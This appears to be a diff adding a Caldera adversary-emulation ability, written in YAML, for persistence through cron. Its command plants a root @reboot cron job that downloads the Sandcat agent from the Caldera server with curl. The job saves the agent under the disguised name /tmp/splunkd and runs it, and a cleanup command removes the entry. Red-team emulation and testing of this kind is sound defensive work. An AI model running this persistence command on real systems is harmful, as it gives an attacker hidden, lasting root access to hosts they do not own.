@@ -1,0 +1,41 @@
+- description: After target host is rebooted, it will automatically reach out to the
+    caldera server to download and execute the caldera agent, creating persistent
+    root access after reboot.
+  plugin: ''
+  buckets: []
+  technique_id: T1053.003
+  access: {}
+  name: Create persistence cron job for root user (requires sudo)
+  tactic: persistence
+  requirements: []
+  privilege: ''
+  singleton: true
+  repeatable: false
+  delete_payload: true
+  executors:
+  - timeout: 60
+    uploads: []
+    cleanup:
+    - 'echo #{sudo.password} | sudo -S sh -c ''(crontab -l | grep -v "@reboot sleep
+      180 && server=\"http://#{caldera.server}:8888\"") | crontab - && rm /tmp/splunkd'''
+    platform: linux
+    variations: []
+    name: sh
+    payloads: []
+    language: null
+    command: 'echo #{sudo.password} | sudo -S sh -c ''if crontab -l &> /dev/null;
+      then (crontab -l; echo "@reboot sleep 180 && server=\"http://#{caldera.server}:8888\";
+      curl -s -X POST -H \"file:sandcat.go\" -H \"platform:linux\" \$server/file/download
+      > /tmp/splunkd;chmod +x /tmp/splunkd;/tmp/./splunkd -server \$server -group
+      red -v") | crontab -; else echo "@reboot sleep 180 && server=\"http://#{caldera.server}:8888\";curl
+      -s -X POST -H \"file:sandcat.go\" -H \"platform:linux\" \$server/file/download
+      > /tmp/splunkd;chmod +x /tmp/splunkd;/tmp/./splunkd -server \$server -group
+      red -v" | crontab -; fi'''
+    build_target: null
+    parsers: []
+    additional_info: {}
+    code: null
+  technique_name: 'Scheduled Task/Job: Cron'
+  additional_info:
+    cleanup: '[]'
+  id: 0cd686c7-8d70-434e-a20c-2fc58f51a51a
